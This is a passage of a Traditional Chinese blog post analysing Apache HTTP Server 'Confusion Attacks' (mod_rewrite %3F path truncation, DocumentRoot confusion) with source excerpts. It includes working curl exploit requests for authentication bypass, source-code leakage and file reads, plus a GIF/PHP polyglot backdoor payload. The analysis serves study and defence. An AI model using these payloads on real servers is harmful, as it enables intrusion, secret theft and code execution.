<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>Apache HTTP Server Confusion Attacks 之技術分析</title><meta name="description" content="孫逸平的個人部落格，分享資訊安全、創客專案、程式設計與技術心得。臺北市數位實驗高中學生，專精於網路安全、CTF競賽和技術開發。"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics 4 --><script async src="https://www.googletagmanager.com/gtag/js?id=G-DPPW3TCM0K"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-DPPW3TCM0K');</script><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/img/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="壹、摘要常見的網頁伺服器包含 Apache HTTP Server、Nginx 和 IIS 等，其中 Apache HTTP Server 因開源、跨平台等優點被廣泛使用，然而卻在去年（2024）被 Orange Tsai 通報了高達 9 個漏洞，並將這類攻擊命名為「Confusion Attacks」。本技術分析報告將針對 Orange Tsai 在 Black Hat 2024 的演講《Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!》中提出的技術進行研究分析。雖然相關漏洞於新版 2.4.60 版本已進行修復，但因為許多更新修復無法向下兼容，因此若網站管理者任意更新，將可能導致許多舊有的設定失效。.."><meta name="keywords" content="Apache, HTTP Server, Confusion Attacks, CVE-2024, Orange Tsai, mod_rewrite, RewriteRule, 網頁安全, 資安漏洞, Black Hat 2024, DocumentRoot, Filename Confusion, Handler Confusion, SSRF, XSS, LFI, 檔案讀取, 路徑截斷, PHP-FPM, 認證繞過, 存取控制繞過, 原始碼洩漏, CGI, 資安研究, 技術分析, CTF, STDiO24CTF, 漏洞利用, 網站安全, 伺服器安全, post, blog, 1Ping, 孫逸平"><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="1Ping's Blog" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">1Ping's Blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Apache HTTP Server Confusion Attacks 之技術分析</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A3%B9%E3%80%81%E6%91%98%E8%A6%81"><span class="toc-text">壹、摘要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B2%B3%E3%80%81Confusion-Attacks"><span class="toc-text">貳、Confusion Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81Filename-Confusion"><span class="toc-text">一、Filename Confusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E8%B7%AF%E5%BE%91%E6%88%AA%E6%96%B7"><span class="toc-text">（一）路徑截斷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%AA%A4%E5%B0%8E-RewriteFlag-%E8%A6%8F%E5%89%87"><span class="toc-text">（二）誤導 RewriteFlag 規則</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E7%B9%9E%E9%81%8E%E8%AA%8D%E8%AD%89%E8%88%87%E5%AD%98%E5%8F%96%E6%8E%A7%E5%88%B6"><span class="toc-text">（三）繞過認證與存取控制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81DocumentRoot-Confusion"><span class="toc-text">二、DocumentRoot Confusion</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%8E%9F%E5%A7%8B%E7%A2%BC%E6%B4%A9%E6%BC%8F"><span class="toc-text">（一）原始碼洩漏</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%B4%A9%E6%BC%8F-CGI-%E5%8E%9F%E5%A7%8B%E7%A2%BC"><span class="toc-text">1. 洩漏 CGI 原始碼</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%B4%A9%E6%BC%8F-PHP-%E5%8E%9F%E5%A7%8B%E7%A2%BC"><span class="toc-text">2. 洩漏 PHP 原始碼</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AD%98%E5%8F%96%E4%BB%BB%E6%84%8F%E6%AA%94%E6%A1%88"><span class="toc-text">（二）存取任意檔案</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E8%B3%87%E8%A8%8A%E6%B4%A9%E6%BC%8F"><span class="toc-text">1. 資訊洩漏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-XSS"><span class="toc-text">2. XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-LFI"><span class="toc-text">3. LFI</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-SSRF"><span class="toc-text">4. SSRF</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%83%E3%80%81%E6%B7%B1%E5%85%A5%E5%AD%B8%E7%BF%92"><span class="toc-text">參、深入學習</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81CTF-%E7%B7%B4%E7%BF%92"><span class="toc-text">一、CTF 練習</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B0%88%E6%A1%88"><span class="toc-text">二、專案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%82%86%E3%80%81%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99"><span class="toc-text">肆、參考資料</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Cyber"><i class="tag post-item-tag">Cyber</i></a><a href="/tags/Note"><i class="tag post-item-tag">Note</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">Apache HTTP Server Confusion Attacks 之技術分析</h1><time class="has-text-grey" datetime="2025-07-28T16:00:00.000Z">2025-07-29</time><article class="mt-2 post-content"><h2 id="壹、摘要"><a href="#壹、摘要" class="headerlink" title="壹、摘要"></a>壹、摘要</h2><p>常見的網頁伺服器包含 Apache HTTP Server、Nginx 和 IIS 等，其中 Apache HTTP Server 因開源、跨平台等優點被廣泛使用，然而卻在去年（2024）被 Orange Tsai 通報了高達 9 個漏洞，並將這類攻擊命名為「Confusion Attacks」。本技術分析報告將針對 Orange Tsai 在 Black Hat 2024 的演講《Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!》中提出的技術進行研究分析。雖然相關漏洞於新版 2.4.60 版本已進行修復，但因為許多更新修復無法向下兼容，因此若網站管理者任意更新，將可能導致許多舊有的設定失效。</p>
<h2 id="貳、Confusion-Attacks"><a href="#貳、Confusion-Attacks" class="headerlink" title="貳、Confusion Attacks"></a>貳、Confusion Attacks</h2><p>在了解 Confusion Attacks 之前，需要先了解 Apache HTTP Server 的架構。Apache HTTP Server 由許多小模組組成（<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/">官方共列出 132 個模組</a>），雖然這些模組各自可能不存在漏洞，但因為沒有了解模組間的實作細節，產生「交互作用」的問題，因此將其命名為「Confusion Attacks」。以下是發展出的攻擊：</p>
<ol>
<li>Filename Confusion</li>
<li>DocumentRoot Confusion</li>
<li>Handler Confusion</li>
</ol>
<p>從以上攻擊出發，他們找到了 9 個漏洞：</p>
<ol>
<li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li>
<li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li>
<li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li>
<li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect</li>
<li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li>
<li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li>
<li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li>
<li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li>
<li><strong>CVE-2024-??????</strong> - [redacted]</li>
</ol>
<p>本研究分析報告將著重在「Filename Confusion」及「DocumentRoot Confusion」，並帶入 CTF 題目 Writeup 及自製的 AI 解題工具。</p>
<h3 id="一、Filename-Confusion"><a href="#一、Filename-Confusion" class="headerlink" title="一、Filename Confusion"></a>一、Filename Confusion</h3><h4 id="（一）路徑截斷"><a href="#（一）路徑截斷" class="headerlink" title="（一）路徑截斷"></a>（一）路徑截斷</h4><p><strong>漏洞觸發條件：</strong></p>
<ul>
<li>存在 <code>RewriteRule</code> 規則進行路徑重寫</li>
<li>攻擊者可以控制 URL 路徑中的部分內容</li>
</ul>
<p><code>mod_rewrite</code> 模組可以透過 <code>RewriteRule</code> 語法將路徑根據規則改寫。在改寫路徑時，會透過 <code>splitout_queryargs()</code> 強制將其視為網址，導致可透過 <code>%3F</code>（<code>?</code> 的 URL 編碼）截斷路徑。</p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteRule</span> Pattern Substitution<span class="hljs-meta"> [flags]</span></code></pre>

<p><strong>Path:</strong> <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules/mappers/mod_rewrite.c#L4141</a></p>
<pre><code class="hljs c"><span class="hljs-comment">/*</span>
<span class="hljs-comment"> * Apply a single RewriteRule</span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">apply_rewrite_rule</span><span class="hljs-params">(rewriterule_entry *p, rewrite_ctx *ctx)</span>
{
    <span class="hljs-type">ap_regmatch_t</span> regmatch[AP_MAX_REG_MATCH];
    <span class="hljs-type">apr_array_header_t</span> *rewriteconds;
    rewritecond_entry *conds;
    
    <span class="hljs-comment">// [...]</span>
    
    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rewriteconds-&gt;nelts; ++i) {
        rewritecond_entry *c = &amp;conds[i];
        rc = apply_rewrite_cond(c, ctx);
        
        <span class="hljs-comment">// [...] do the remaining stuff</span>
        
    }
    
    <span class="hljs-comment">/* Now adjust API's knowledge about r-&gt;filename and r-&gt;args */</span>
    r-&gt;filename = newuri;

    <span class="hljs-keyword">if</span> (ctx-&gt;perdir &amp;&amp; (p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) {
        r-&gt;path_info = <span class="hljs-literal">NULL</span>;
    }

    splitout_queryargs(r, p-&gt;flags);         <span class="hljs-comment">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span>
    
    <span class="hljs-comment">// [...]</span>
}</code></pre>

<p>想像下方 <code>RewriteRule</code> 規則：</p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span>
<span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">"^/user/(.+)$"</span> <span class="hljs-string">"/var/user/$1/profile.yml"</span></code></pre>

<p>伺服器會依據路徑 <code>/user/</code> 之後的使用者名稱，回應相對應的個人資料檔案：</p>
<pre><code class="hljs bash">$ curl http://server/user/1Ping
<span class="hljs-comment"># the output of file `/var/user/1Ping/profile.yml`</span></code></pre>

<p>由於 <code>mod_rewrite</code> 模組的路徑改寫會將當作網址處理，因此可透過 <code>?</code> 截斷後面的 <code>/profile.yml</code>。</p>
<pre><code class="hljs bash">$ curl http://server/user/1Ping%2Fsecret.yml%3F
<span class="hljs-comment"># the output of file `/var/user/1Ping/secret.yml`</span></code></pre>

<h4 id="（二）誤導-RewriteFlag-規則"><a href="#（二）誤導-RewriteFlag-規則" class="headerlink" title="（二）誤導 RewriteFlag 規則"></a>（二）誤導 <code>RewriteFlag</code> 規則</h4><p><strong>漏洞觸發條件：</strong></p>
<ul>
<li>使用 <code>mod_rewrite</code> 模組且設定基於副檔名的處理規則</li>
<li>存在文件上傳功能或可控制的檔案內容</li>
<li><code>RewriteRule</code> 規則基於檔案副檔名進行比對（如 <code>\.php$</code>）</li>
</ul>
<p>除了誤導改寫網址外，也可以嘗試誤導 <code>RewriteFlag</code> 的規則。想像網站透過以下規則處理請求，當結尾 <code>.php</code> 時，則加上相對應的處理器，也可以是加上環境變數或 <code>Content-Type</code>。</p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span>
<span class="hljs-attribute">RewriteRule</span>  ^(.+\.php)$  $<span class="hljs-number">1</span> <span class="hljs-meta"> [H=application/x-httpd-php]</span></code></pre>

<p>當請求一個資源 <code>1.gif%3fooo.php</code> 時，因為符合上方規則，因此會將其解析成 <code>php</code> 檔並執行，然而 <code>mod_rewrite</code> 會將其當作網址處理，因此回應資源 <code>1.gif</code>。透過此種方式，就有機會上傳帶有 PHP 惡意程式的 GIF 圖檔製作後門程式。</p>
<pre><code class="hljs bash">$ curl http://server/upload/1.gif
<span class="hljs-comment"># Response: GIF89a &lt;?=`id`;&gt;</span>

$ curl http://server/upload/1.gif%3fooo.php
<span class="hljs-comment"># Response: GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>

<h4 id="（三）繞過認證與存取控制"><a href="#（三）繞過認證與存取控制" class="headerlink" title="（三）繞過認證與存取控制"></a>（三）繞過認證與存取控制</h4><ul>
<li>預設安裝 PHP-FPM</li>
<li>針對單一檔案的認證或存取控制（如 <code>&lt;Files&gt;</code> 指令）</li>
</ul>
<p>在 <code>mod_proxy</code> 模組，因為模組間對於檔案名稱理解的不一致，導致認證與存取控制的繞過。</p>
<p>以下是一個經典的範例，它透過 <code>File</code> 語法對單一檔案加上限制，只有被驗證的使用者才能存取 <code>admin.php</code> 檔案：</p>
<pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files <span class="hljs-string">"admin.php"</span>&gt;</span>
    <span class="hljs-attribute">AuthType</span> Basic 
    <span class="hljs-attribute">AuthName</span> <span class="hljs-string">"Admin Panel"</span>
    <span class="hljs-attribute">AuthUserFile</span> <span class="hljs-string">"/etc/apache2/.htpasswd"</span>
    <span class="hljs-attribute">Require</span> valid-user
<span class="hljs-section">&lt;/Files&gt;</span></code></pre>

<p>在預設有安裝 PHP-FPM 的環境中，上放設定可以直接被繞過。假設你瀏覽以下路徑：</p>
<pre><code class="hljs url">http://server/admin.php%3Fooo.php</code></pre>

<p>認證模組會將請求的檔名與保護的檔名比對，因為 <code>admin.php%3Fooo.php</code> 與 <code>admin.php</code> 不相符，因此模組認定此請求不需要被認證。</p>
<p>接著因 PHP-FPM 設定結尾為 <code>.php</code> 時，會透過語法 <code>SetHandler</code> 將請求轉給 <code>mod_proxy</code>。</p>
<p><strong>Path</strong>: /etc/apache2/mods-enabled/php8.2-fpm.conf</p>
<pre><code class="hljs apacheconf"><span class="hljs-comment"># Using (?:pattern) instead of (pattern) is a small optimization that</span>
<span class="hljs-comment"># avoid capturing the matching pattern (as $1) which isn't used here</span>
<span class="hljs-section">&lt;FilesMatch <span class="hljs-string">".+\.ph(?:ar|p|tml)$"</span>&gt;</span>
    <span class="hljs-attribute">SetHandler</span> <span class="hljs-string">"proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"</span>
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>

<p><code>mod_proxy</code> 會將檔案名稱重寫成以下網址，並呼叫子模組：</p>
<pre><code class="hljs url">proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php</code></pre>

<p>此時後端收到的檔案名稱已經是奇怪的格式（有一個 <code>?</code>）。因此 PHP-FPM 會對其的 <code>?</code> 部分進行分隔並執行。因此會執行檔案 <code>/var/www/html/admin.php</code>，成功繞過單一檔案的認證或存取控制設定：</p>
<p><strong>Path:</strong> <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi/fpm/fpm/fpm_main.c#L1044</a></p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> APACHE_PROXY_FCGI_PREFIX <span class="hljs-string">"proxy:fcgi://"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> APACHE_PROXY_BALANCER_PREFIX <span class="hljs-string">"proxy:balancer://"</span></span>

<span class="hljs-keyword">if</span> (env_script_filename &amp;&amp;
    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, <span class="hljs-keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) {
    <span class="hljs-comment">/* advance to first character of hostname */</span>
    <span class="hljs-type">char</span> *p = env_script_filename + (<span class="hljs-keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">while</span> (*p != <span class="hljs-string">'\0'</span> &amp;&amp; *p != <span class="hljs-string">'/'</span>) {
        p++;    <span class="hljs-comment">/* move past hostname and port */</span>
    }
    <span class="hljs-keyword">if</span> (*p != <span class="hljs-string">'\0'</span>) {
        <span class="hljs-comment">/* Copy path portion in place to avoid memory leak.  Note</span>
<span class="hljs-comment">         * that this also affects what script_path_translated points</span>
<span class="hljs-comment">         * to. */</span>
        memmove(env_script_filename, p, <span class="hljs-built_in">strlen</span>(p) + <span class="hljs-number">1</span>);
        apache_was_here = <span class="hljs-number">1</span>;
    }
    <span class="hljs-comment">/* ignore query string if sent by Apache (RewriteRule) */</span>
    p = <span class="hljs-built_in">strchr</span>(env_script_filename, <span class="hljs-string">'?'</span>);
    <span class="hljs-keyword">if</span> (p) {
        *p =<span class="hljs-number">0</span>;
    }
}</code></pre>

<p>在 GitHub 上可以找到許多有潛在危險的設定。</p>
<ul>
<li>限制只有內網能夠存取的檔案  <pre><code class="hljs apacheconf"><span class="hljs-comment"># protect phpinfo, only allow localhost and local network access</span>
<span class="hljs-section">&lt;Files php-info.php&gt;</span>
    <span class="hljs-comment"># LOCAL ACCESS ONLY</span>
    <span class="hljs-comment"># Require local </span>

    <span class="hljs-comment"># LOCAL AND LAN ACCESS</span>
    <span class="hljs-attribute">Require</span> ip <span class="hljs-number">10</span> <span class="hljs-number">172</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>
<span class="hljs-section">&lt;/Files&gt;</span></code></pre></li>
<li>使用 <code>.htaccess</code> 阻擋的檔案  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files adminer.php&gt;</span>
    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span>
    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span>
<span class="hljs-section">&lt;/Files&gt;</span></code></pre>

  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files xmlrpc.php&gt;</span>
    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span>
    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span>
<span class="hljs-section">&lt;/Files&gt;</span></code></pre></li>
<li>禁止直接存取的檔案  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files <span class="hljs-string">"cron.php"</span>&gt;</span>
    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span>
<span class="hljs-section">&lt;/Files&gt;</span></code></pre></li>
</ul>
<p>以上的範例均可透過 <code>?</code> 符號繞過。</p>
<h3 id="二、DocumentRoot-Confusion"><a href="#二、DocumentRoot-Confusion" class="headerlink" title="二、DocumentRoot Confusion"></a>二、DocumentRoot Confusion</h3><p>漏洞利用條件：</p>
<ul>
<li>危險的 RewriteRule，例如：  <pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^(.*)\.(css|js|ico|svg)"</span> <span class="hljs-string">"$1\.$2.gz"</span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/oldwebsite/(.*)$"</span>  <span class="hljs-string">"/$1"</span>
<span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%{REQUEST_METHOD}</span> OPTIONS
<span class="hljs-attribute">RewriteRule</span> ^(.*)$ $<span class="hljs-number">1</span><span class="hljs-meta"> [R=200,L]</span></code></pre></li>
<li>啟用 <code>RewriteEngine On</code></li>
<li>Ubuntu/Debian 提供更多利用機會</li>
</ul>
<p>在下方的 Httpd 設定當中，若請求 <code>http://server/html/about</code>，實際上會開啟 <code>/about.html</code> 及 DocumentRoot 下的 <code>/var/www/html/about.html</code>。</p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">DocumentRoot</span> /var/www/html
<span class="hljs-attribute">RewriteRule</span>  ^/html/(.*)$   /$<span class="hljs-number">1</span>.html</code></pre>

<p>原始碼如下：</p>
<p><strong>Path:</strong> <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules/mappers/mod_rewrite.c#L4939</a></p>
<pre><code class="hljs apacheconf">    <span class="hljs-attribute">if</span>(!(conf-&gt;options &amp; OPTION_LEGACY_PREFIX_DOCROOT)) {
        <span class="hljs-attribute">uri_reduced</span> = apr_table_get(r-&gt;notes, <span class="hljs-string">"mod_rewrite_uri_reduced"</span>);
    }

    <span class="hljs-attribute">if</span> (!prefix_stat(r-&gt;filename, r-&gt;pool) || uri_reduced != NULL) {     // &lt;------<span class="hljs-meta"> [1] access without root</span>
<span class="hljs-meta">        int res;</span>
<span class="hljs-meta">        char *tmp = r-&gt;uri;</span>
<span class="hljs-meta"></span>
<span class="hljs-meta">        r-&gt;uri = r-&gt;filename;</span>
<span class="hljs-meta">        res = ap_core_translate(r);             // &lt;------ [2] access with root</span>
<span class="hljs-meta">        r-&gt;uri = tmp;</span>
<span class="hljs-meta"></span>
<span class="hljs-meta">        if (res != OK) {</span>
<span class="hljs-meta">            rewritelog((r, 1, NULL, "prefixing with document_root of %s"</span>
<span class="hljs-meta">                        " FAILED", r-&gt;filename));</span>
<span class="hljs-meta"></span>
<span class="hljs-meta">            return res;</span>
<span class="hljs-meta">        }</span>
<span class="hljs-meta"></span>
<span class="hljs-meta">        rewritelog((r, 2, NULL, "prefixed with document_root to %s",</span>
<span class="hljs-meta">                    r-&gt;filename));</span>
<span class="hljs-meta">    }</span>
<span class="hljs-meta"></span>
<span class="hljs-meta">    rewritelog((r, 1, NULL, "go-ahead with %s [OK]", r-&gt;filename));</span>
<span class="hljs-meta">    return OK;</span>
<span class="hljs-meta">}</span></code></pre>

<p>如果能夠控制 <code>RewriteRule</code> 的前綴，就有機會能夠瀏覽系統上的任何檔案。以下是一些容易受影響的 <code>RewriteRule</code>：</p>
<pre><code class="hljs apacheconf"><span class="hljs-comment"># 1 </span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span>

<span class="hljs-comment"># 2 </span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^(.*)\.(css|js|ico|svg)"</span> <span class="hljs-string">"$1\.$2.gz"</span>

<span class="hljs-comment"># 3</span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/oldwebsite/(.*)$"</span>  <span class="hljs-string">"/$1"</span>

<span class="hljs-comment"># 4</span>
<span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%{REQUEST_METHOD}</span> OPTIONS
<span class="hljs-attribute">RewriteRule</span> ^(.*)$ $<span class="hljs-number">1</span><span class="hljs-meta"> [R=200,L]</span></code></pre>

<p>接下來的範例將透過以下 <code>RewriteRule</code> 做示範：</p>
<pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span>
<span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span></code></pre>

<h4 id="（一）原始碼洩漏"><a href="#（一）原始碼洩漏" class="headerlink" title="（一）原始碼洩漏"></a>（一）原始碼洩漏</h4><h5 id="1-洩漏-CGI-原始碼"><a href="#1-洩漏-CGI-原始碼" class="headerlink" title="1. 洩漏 CGI 原始碼"></a>1. 洩漏 CGI 原始碼</h5><p>CGI 程式碼當中可能包含一些機密敏感資料，包含資料庫的帳號密碼等，CGI 程式碼執行時，是透過 <code>ScriptAlias</code> 與原始的目錄綁定，若使用絕對路徑請求，就能看到其原始碼。</p>
<pre><code class="hljs bash">$ curl http://server/cgi-bin/download.cgi
<span class="hljs-comment"># the processed result from download.cgi</span>

$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
<span class="hljs-comment"># #!/usr/bin/perl</span>
<span class="hljs-comment"># use CGI;</span>
<span class="hljs-comment"># ...</span>
<span class="hljs-comment"># # the source code of download.cgi</span></code></pre>

<h5 id="2-洩漏-PHP-原始碼"><a href="#2-洩漏-PHP-原始碼" class="headerlink" title="2. 洩漏 PHP 原始碼"></a>2. 洩漏 PHP 原始碼</h5><p>若只針對特定目錄或虛擬主機套用 PHP 環境，則可透過未啟用的虛擬主機存取 PHP 原始碼。</p>
<p>例如：<code>www.local</code> 及 <code>static.local</code> 兩台虛擬主機在同一台伺服器上，其中 <code>www.local</code> 負責執行 PHP，<code>static.local</code> 則只負責回應靜態的資源。因此透過以下範例可透過修改 <code>Host</code> 表頭取得 <code>config.php</code> 的原始碼。</p>
<pre><code class="hljs bash">$ curl http://www.local/config.php
<span class="hljs-comment"># the processed result (empty) from config.php</span>

$ curl http://www.local/var/www.local/config.php%3F -H <span class="hljs-string">"Host: static.local"</span>
<span class="hljs-comment"># the source code of config.php</span></code></pre>

<h4 id="（二）存取任意檔案"><a href="#（二）存取任意檔案" class="headerlink" title="（二）存取任意檔案"></a>（二）存取任意檔案</h4><p>透過不安全的 <code>RewriteRule</code> 雖然能夠讀取任意的檔案，但同時在 Apache HTTP Server 的設定檔模板中，預設禁止了根目錄的存取：</p>
<p><strong>Path:</strong> <a target="_blank" rel="noopener" href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">httpd/docs/conf/httpd.conf.in#L115</a></p>
<pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Directory /&gt;</span>
    <span class="hljs-attribute">AllowOverride</span> None
    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> denied
<span class="hljs-section">&lt;/Directory&gt;</span></code></pre>

<p>然而，在 Debian 架構的作業系統中（例如：Ubuntu），預設允許 <code>/usr/share</code>。雖然無法直接存取到 <code>/ets/passwd</code>，但還是增加了利用的機會。</p>
<h5 id="1-資訊洩漏"><a href="#1-資訊洩漏" class="headerlink" title="1. 資訊洩漏"></a>1. 資訊洩漏</h5><p>如果 Apache HTTP Server 安裝了 <code>websocketd</code> 服務，預設會在 <code>/usr/share/doc/websocketd/examples/php/</code> 中，放一個範例 PHP 檔 <code>dump-env.php</code>，如果伺服器為 PHP 環境，就能夠洩漏敏感的環境變數。</p>
